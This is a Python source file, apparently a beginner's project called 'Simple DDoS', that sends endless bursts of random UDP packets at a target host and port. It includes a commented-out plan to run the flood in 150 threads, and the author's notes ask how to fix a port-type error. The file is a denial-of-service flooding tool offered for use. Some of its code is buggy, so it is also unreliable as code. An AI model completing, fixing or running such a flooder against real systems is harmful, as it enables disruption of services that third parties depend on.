"""Top-level package for Simple DDoS."""
# simple_ddos/py_ddos.py


import os
import platform
import random
import ipaddress
from ipaddress import IPv4Address

import typer

# import threading
import socket

# TODO: Read docs on time, os, random, threading, and platform
# TODO: Take questions to Mastodon
# TODO: Eat good food
# TODO: Get plenty of water and sleep


# v1: just create ddos script

# Instead of using SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being hit

# Is there enough precedent with ipv6 addresses to use socket.AF_INET6?
# How would that work?

# TODO: research ipv6

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes1 = random.randbytes(2000)
bytes2 = random.randbytes(2900)
system = platform.uname().system

# this is better system = getattr(platform.uname(), "system")
# instead of hardcoding a specific index
# because if something in the l


def check_os():
    if system == 'Windows':
        os.system("cls")
    elif system == 'Unix':
        os.system("clear")


# call function to check what system is used

# Why use a try

def ddos(target, port, ip: bool = False):
    sent = 0
    try:
        while True:
            net = socket.gethostbyname(target)
            sock.sendto(bytes1, (net, port))
            sent = sent + 1

            print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))
            while True:
                net2 = socket.gethostbyname(target)
                sock.sendto(bytes2, (net2, port))
                sent = sent + 1
                print("Sending %s packets to %s through port:%s" % (sent, ipaddress, port))

    # Break out of infinite loop

    except KeyboardInterrupt:
        print('\n' + 'Keyboard Interrupt. Terminating session...')

    except socket.gaierror:
        print('Unknown address.')
        print('Please input the correct ip address.')

    except NameError:
        print('Unknown address.')
        print('Please input the correct ip address.')

# For introducing to the script later

# for i in range(150):
#     thread = threading.Thread(target=ddos)
#     thread.start()

# This is the line I use to run this script:
# python py_ddos.py "192.168.xx.xxx" "port"
# This is the Error:
# sock.sendto(bytes1, (net, port))
# TypeError: 'str' object cannot be interpreted as an integer
# What am I missing here?


if __name__ == "__main__":
    typer.run(ddos)